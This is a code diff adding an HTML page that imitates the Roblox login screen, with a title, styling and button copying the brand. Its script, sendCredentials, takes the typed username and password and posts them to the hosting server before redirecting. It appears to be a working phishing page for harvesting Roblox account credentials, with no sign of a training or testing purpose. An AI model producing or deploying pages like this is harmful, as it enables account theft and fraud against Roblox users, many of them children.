@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox | Login</title>
+    <style>
+        body {
+            background-color: #232527;
+            color: white;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background-color: #393b3d;
+            padding: 30px;
+            border-radius: 10px;
+            width: 320px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        h1 { margin-bottom: 20px; font-size: 24px; }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            background-color: #232527;
+            color: white;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00b06f;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        button:hover { background-color: #008a59; }
+        .footer { margin-top: 20px; font-size: 12px; color: #aaa; }
+        #status { margin-top: 10px; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>Login</h1>
+        <input type="text" id="username" placeholder="Username" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button onclick="sendCredentials()">Log In</button>
+        <div id="status"></div>
+        <div class="footer">
+            <p>Need help? <a href="#" style="color: #00b06f;">Contact Support</a></p>
+        </div>
+    </div>
+
+    <script>
+        async function sendCredentials() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const statusDiv = document.getElementById('status');
+
+            if (!username || !password) {
+                statusDiv.innerText = "Please enter username and password.";
+                statusDiv.style.color = "red";
+                return;
+            }
+
+            statusDiv.innerText = "Logging in...";
+            statusDiv.style.color = "#00b06f";
+
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    statusDiv.innerText = "Success! Redirecting...";
+                    setTimeout(() => {
+                        window.location.href = result.redirect;
+                    }, 1500);
+                } else {
+                    statusDiv.innerText = result.message || "Login failed.";
+                    statusDiv.style.color = "red";
+                }
+            } catch (error) {
+                console.error(error);
+                statusDiv.innerText = "Connection error.";
+                statusDiv.style.color = "red";
+            }
+        }
+    </script>
+</body>
+</html>
